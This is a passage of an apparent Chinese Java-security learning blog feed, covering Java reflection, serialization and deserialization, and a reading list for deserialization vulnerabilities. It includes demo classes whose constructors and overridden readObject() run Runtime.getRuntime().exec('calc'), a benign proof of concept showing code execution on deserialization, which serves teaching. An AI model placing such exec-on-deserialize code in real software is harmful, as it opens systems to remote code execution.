getClass();返回值的类型是一个Class类，此类是Java反射的源头，实际上所谓反射从程序的运行结果来看也很好理解，即：可以通过对象反射求出类的名称。</p><p>通过四种方法可以获取class对象</p><ul><li><p>若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Person&gt; clazz &#x3D; Person.class</span><br></pre></td></tr></table></figure></li><li><p>已知某个类的实例，调用该实例的getClass()方法获取Class对象；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person person &#x3D; new Person();</span><br><span class="line">Class clazz &#x3D; person.getClass();</span><br></pre></td></tr></table></figure></li><li><p>已知一个类的全类名，且该类在类路径下，可通过Class类的静态方法forName()获取，可能会抛出异常ClassNotFoundException</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    class1 &#x3D; Class.forName(&quot;xxx.Person&quot;);</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>通过类加载器来获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader clazz &#x3D; this.getClass().getClassLoader();</span><br><span class="line">Class clazz &#x3D; clazz.loadClass(“类的全类名”);</span><br></pre></td></tr></table></figure></li></ul><h3 id="java-lang-reflect-Constructor"><a href="#java-lang-reflect-Constructor" class="headerlink" title="java.lang.reflect.Constructor"></a>java.lang.reflect.Constructor</h3><p>对应实现 2.2在运行时构造任意一个类的对象。</p><p>class对象动态生成的方法：</p><ol><li>调用Class对象的new instance() 方法来实例化，注意这种方法只能调用无参构造器：<code>Object obj = class1.newInstance();</code></li><li>对象获得对应的Constructor对象，再通过该Constructor对象的newInstance()方法生成</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = class1.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;)</span>;<span class="comment">//获取指定声明构造函数。指定new Class[]&#123;String.class&#125;设置传参的类</span></span><br><span class="line">obj = constructor.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="string">"lcj"</span>&#125;);</span><br></pre></td></tr></table></figure><h3 id="java-lang-reflect-Field-和-java-lang-reflect-Method"><a href="#java-lang-reflect-Field-和-java-lang-reflect-Method" class="headerlink" title="java.lang.reflect.Field 和 java.lang.reflect.Method;"></a>java.lang.reflect.Field 和 java.lang.reflect.Method;</h3><p>对应实现 2.3在运行时判断任意一个类所具有的成员变量和方法和2.4在运行时调用任意一个对象的成员变量和方法。</p><p>getFields()和 getMethods()用来获取类的成员变量和方法</p><p>Object invoke(Object obj, Object[] args)调用类的方法，并向方法中传递要设置的obj对象及其方法需要参数信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Field[] allFields = class1.getDeclaredFields();<span class="comment">//获取class对象的所有属性</span></span><br><span class="line">Field[] publicFields = class1.getFields();<span class="comment">//获取class对象的public属性</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Field ageField = class1.getDeclaredField(<span class="string">"age"</span>);<span class="comment">//获取class指定属性</span></span><br><span class="line">    Field desField = class1.getField(<span class="string">"des"</span>);<span class="comment">//获取class指定的public属性</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Method[] methods = class1.getDeclaredMethods();<span class="comment">//获取class对象的所有声明方法</span></span><br><span class="line">Method[] allMethods = class1.getMethods();<span class="comment">//获取class对象的所有方法 包括父类的方法</span></span><br><span class="line"></span><br><span class="line">getAgeMethod  = getDeclaredMethod(<span class="string">"getAge"</span>);</span><br><span class="line">Object result = getAgeMethod.invoke(obj, <span class="keyword">new</span> Class[]&#123;&#125;);<span class="comment">//调用方法</span></span><br></pre></td></tr></table></figure><h2 id="0x04-示例"><a href="#0x04-示例" class="headerlink" title="0x04 示例"></a>0x04 示例</h2><p>先定义一个类TestClass</p><figure class="highlight java"><figcaption><span>TestClass</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String a = <span class="string">"adf"</span>;</span><br><span class="line">    <span class="keyword">private</span> String b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(String v)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"正在执行method方法..."</span>);</span><br><span class="line">        System.out.println(v);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getB</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> ReflectTest可以通过反射机制获取类名、类的属性和方法、实例化类并执行方法</p><figure class="highlight java"><figcaption><span>ReflectTest.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;</span><br><span class="line">        ReflectTest reflectTest = <span class="keyword">new</span> ReflectTest();</span><br><span class="line">        reflectTest.getAllFiled();</span><br><span class="line">        reflectTest.getAllMethod();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//实例化类并执行方法</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">"r17a.Learning0905.ReflectTest.TestClass"</span>);</span><br><span class="line">        Object object = clazz.newInstance();</span><br><span class="line">        Method method = clazz.getDeclaredMethod(<span class="string">"method"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        method.invoke(object,<span class="string">"这是我的输入"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getAllFiled</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取类</span></span><br><span class="line">        Class testClass = TestClass<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        System.out.println(<span class="string">"类的名称："</span> + testClass.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取所有 public 访问权限的变量</span></span><br><span class="line">        <span class="comment">// Field[] fields = testClass.getFields();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有本类声明的变量（不问访问权限）</span></span><br><span class="line">        Field[] fields = testClass.getDeclaredFields();</span><br><span class="line">        <span class="comment">//遍历变量并输出变量信息</span></span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            <span class="comment">//获取访问权限并输出</span></span><br><span class="line">            <span class="keyword">int</span> modifiers = field.getModifiers();</span><br><span class="line">            System.out.print(Modifier.toString(modifiers) + <span class="string">" "</span>);</span><br><span class="line">            <span class="comment">//输出变量的类型及变量名</span></span><br><span class="line">            System.out.println(field.getType().getName() + <span class="string">" "</span> + field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getAllMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取类</span></span><br><span class="line">        Class testClass = TestClass<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        <span class="comment">// 获取类的所有方法</span></span><br><span class="line">        Method[] methods = testClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            <span class="comment">//获取访问权限并输出</span></span><br><span class="line">            <span class="keyword">int</span> modifiers = method.getModifiers();</span><br><span class="line">            System.out.print(Modifier.toString(modifiers) + <span class="string">" "</span>);</span><br><span class="line">            <span class="comment">//输出变量的类型及变量名</span></span><br><span class="line">            System.out.println(method.getReturnType() + <span class="string">" "</span> + method.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="/imgs/image-20200904213632298.png" alt="image-20200904213632298"></p><p>参考链接：</p><p><a href="https://baijiahao.baidu.com/s?id=1645023991123759354&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1645023991123759354&amp;wfr=spider&amp;for=pc</a></p><p><a href="https://www.jianshu.com/p/2d685da7ed74" target="_blank" rel="noopener">https://www.jianshu.com/p/2d685da7ed74</a></p><p><a href="https://www.cnblogs.com/whoislcj/p/6038511.html" target="_blank" rel="noopener">https://www.cnblogs.com/whoislcj/p/6038511.html</a></p><p><a href="https://blog.csdn.net/chengzhang1989/article/details/70216634/" target="_blank" rel="noopener">https://blog.csdn.net/chengzhang1989/article/details/70216634/</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA反射机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java序列化和反序列化</title>
      <link href="2020/06/11/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2020/06/11/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-序列化和反序列化概念"><a href="#0x01-序列化和反序列化概念" class="headerlink" title="0x01 序列化和反序列化概念"></a>0x01 序列化和反序列化概念</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，把字节流还原成对象。</p><h2 id="0x02-为什么要引入序列化"><a href="#0x02-为什么要引入序列化" class="headerlink" title="0x02 为什么要引入序列化"></a>0x02 为什么要引入序列化</h2><p>究竟为什么要用序列化，不用不行吗？</p><p><img src="/imgs/image-20200604162949988.png" alt="image-20200604162949988"></p><p>先看下序列化用途：</p><p>（1）永久性保存对象，保存对象的字节序列到<strong>本地文件或者数据库中</strong>； </p><p>（2）通过序列化以字节流的形式使对象在<strong>网络中进行传递和接收</strong>；</p><p>（3）通过序列化在<strong>进程间传递对象</strong>。</p><p>网上看到基本就是这三个，如上图，基本就是在文件、网络、进程中传输字节流。看到这里还是不知道啊，往下看，网上找的栗子看了就懂了。</p><p>第一个例子：</p><p>Web 服务器中的 Session 会话对象，当有10万用户并发访问，就有可能出现10万个 Session 对象，显然这种情况内存可能是吃不消的。于是 Web 容器就会把一些 Session 先序列化，让他们离开内存空间，序列化到硬盘中，当需要调用时，再把保存在硬盘中的对象还原到内存中。</p><p>第二个例子：</p><p>当两个进程进行远程通信时，文本、图片、音频、视频的传输可以发送各种类型的数据，包括等， 而这些数据都会以二进制序列的形式在网络上传送。</p><p>到这里基本了解了序列化和反序列化，那具体java是怎么实现序列化的。</p><h2 id="0x03-Java序列化"><a href="#0x03-Java序列化" class="headerlink" title="0x03 Java序列化"></a>0x03 Java序列化</h2><p>在Java中，主要有两个接口ObjectOutputStream(对象输出流) 和ObjectInputStream(对象输入流)，ObjectOutputStream.writeObject()实现序列化，而ObjectInputStream.readObject()方法实现反序列化。</p><h3 id="序列化-反序列化例子1："><a href="#序列化-反序列化例子1：" class="headerlink" title="序列化 反序列化例子1："></a>序列化 反序列化例子1：</h3><p>执行命令的类CommandExec.java：</p><figure class="highlight java"><figcaption><span>CommandExec.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandExec</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommandExec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"calc"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            InputStream is = process.getInputStream();</span><br><span class="line">            InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(String content = br.readLine(); content != <span class="keyword">null</span>; content = br.readLine()) &#123;</span><br><span class="line">                System.out.println(content);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">            var7.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.java</p><figure class="highlight java"><figcaption><span>main.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 序列化测试</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        serializeCommandExec();</span><br><span class="line">        CommandExec commandExec = (CommandExec) deserializeCommandExec();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serializeCommandExec</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        CommandExec commandExec = <span class="keyword">new</span> CommandExec();</span><br><span class="line">        <span class="comment">// ObjectOutputStream 对象输出流</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"d:/test.txt"</span>)));</span><br><span class="line">        oos.writeObject(commandExec);</span><br><span class="line">        System.out.println(<span class="string">"对象序列化成功！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 反序列化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> CommandExec <span class="title">deserializeCommandExec</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"d:/test.txt"</span>)));</span><br><span class="line">        CommandExec commandExec = (CommandExec) ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">"对象反序列化成功！"</span>);</span><br><span class="line">        <span class="keyword">return</span> commandExec;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码的运行结果如下图，在构造对象时弹出1个计算器，序列化生成test.txt文件，并且由文件反序列化成一个对象：</p><p><img src="/imgs/image-20200605105345378.png" alt="image-20200605105345378"></p><img src="/imgs/image-20200605105218619.png" alt="image-20200605105218619" style="zoom:50%;" /><p>上面代码CommandExec.java中在构造函数中我写的是执行calc计算器，这里本来我以为反序列化也可以弹出计算器，但是我的想法是错误的，查了下发现反序列不会调用构造方法，但是会调用父类构造方法，所以我这里改下CommandExec.java，让它继承一个父类，在父类中执行计算器。</p><p><img src="/imgs/image-20200605105751073.png" alt="image-20200605105751073"></p><ul><li><h3 id="改写后的CommandExec-java和父类："><a href="#改写后的CommandExec-java和父类：" class="headerlink" title="改写后的CommandExec.java和父类："></a><strong>改写后的CommandExec.java和父类：</strong></h3></li></ul><p>父类Command.java：</p><figure class="highlight java"><figcaption><span>Command.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Command</span>  </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Command</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String cmd = <span class="string">"calc"</span>;</span><br><span class="line">        System.out.println(<span class="string">"2222"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            InputStream is = process.getInputStream();</span><br><span class="line">            InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(String content = br.readLine(); content != <span class="keyword">null</span>; content = br.readLine()) &#123;</span><br><span class="line">                System.out.println(content);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">            var7.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CommandExec.java</p><figure class="highlight java"><figcaption><span>CommandExec.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandExec</span> <span class="keyword">extends</span>  <span class="title">Command</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommandExec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"1111"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果可以发现是对的，反序列化的时候确实执行了父类的构造方法 没有调用子类的构造方法。序列化之前构造对象时弹出了2个计算器，因为分别调用了父类和子类的构造方法，而反序列化之后生成对象也弹出了1个计算器，所以总共弹出3个计算器窗口。</p><p><img src="/imgs/image-20200605110928243.png" alt="image-20200605110928243"></p><h3 id="反序列化例子2："><a href="#反序列化例子2：" class="headerlink" title="反序列化例子2："></a>反序列化例子2：</h3><p>后续学习遇到的困惑，这里更新下。</p><p>该例子重写了readObject()方法，当我们调用反序列化时会调用ReadObjectOverride.readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadObjectTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//创建一个ReadObjectOverride对象</span></span><br><span class="line">        ReadObjectOverride readObjectOverride = <span class="keyword">new</span> ReadObjectOverride();</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(readObjectOverride);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadObjectOverride</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/imgs/image-20200728163524121.png" alt="image-20200728163524121"></p><p>参考链接</p><p><a href="https://baijiahao.baidu.com/s?id=1636492159314232573&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1636492159314232573&amp;wfr=spider&amp;for=pc</a></p><p><a href="https://www.cnblogs.com/niceyoo/p/10596657.html" target="_blank" rel="noopener">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p><p><a href="https://www.itranslater.com/qa/details/2582634340228269056" target="_blank" rel="noopener">https://www.itranslater.com/qa/details/2582634340228269056</a></p><p><a href="https://blog.csdn.net/weixin_29324013/article/details/80901275" target="_blank" rel="noopener">https://blog.csdn.net/weixin_29324013/article/details/80901275</a></p><p><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">https://paper.seebug.org/312/</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA安全-反序列化类漏洞学习</title>
      <link href="2020/06/10/JAVA%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/06/10/JAVA%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="Java反序列化学习的一些基础知识"><a href="#Java反序列化学习的一些基础知识" class="headerlink" title="Java反序列化学习的一些基础知识"></a>Java反序列化学习的一些基础知识</h2><p>在分析反序列化漏洞前有些知识需要补充下，不然后面分析起来会看不懂，从而导致放弃</p><ol><li>Java序列化和反序列化</li><li>ClassLoader、URLClassLoader</li><li>Java反射机制</li><li>java.lang.invoke.MethodHandle</li><li>Java动态代理 </li><li>Java RMI（Java远程方法调用，基于对象序列化机制实现）</li><li>LDAP（指路：<a href="https://www.jianshu.com/p/7e4d99f6baaf，https://www.jianshu.com/p/d94673be9ed0，https://www.anquanke.com/post/id/201181，建议结合8.JNDI一起看）" target="_blank" rel="noopener">https://www.jianshu.com/p/7e4d99f6baaf，https://www.jianshu.com/p/d94673be9ed0，https://www.anquanke.com/post/id/201181，建议结合8.JNDI一起看）</a></li><li>JNDI</li><li>JVM上的动态语言(如：Groovy、JRuby、Jython)【指路：<a href="https://www.oschina.net/question/5189_23272" target="_blank" rel="noopener">https://www.oschina.net/question/5189_23272</a> ，先了解下】</li><li>Java CORBA（指路：<a href="https://paper.seebug.org/1124/）" target="_blank" rel="noopener">https://paper.seebug.org/1124/）</a></li></ol><h2 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h2><p>分析Java反序列化漏洞，打算用WebLogic和FastJson的典型漏洞来深入分析，从源码到ysoserial工具Gadgets利用链进行解剖。</p><ol><li>xml</li><li>json</li><li>jrmi</li><li>jndi</li><li>iiop</li><li>SnakeYAML</li><li>jYAML</li><li>YamlBeans</li><li>Apache Flex BlazeDS</li><li>Red5 IO AMF</li><li>Jackson</li><li>Castor</li></ol><p>…</p><p><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" target="_blank" rel="noopener">https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet</a></p><p><a href="https://paper.seebug.org/1131/" target="_blank" rel="noopener">https://paper.seebug.org/1131/</a></p><p><a href="https://www.jianshu.com/p/776c56fc3a80" target="_blank" 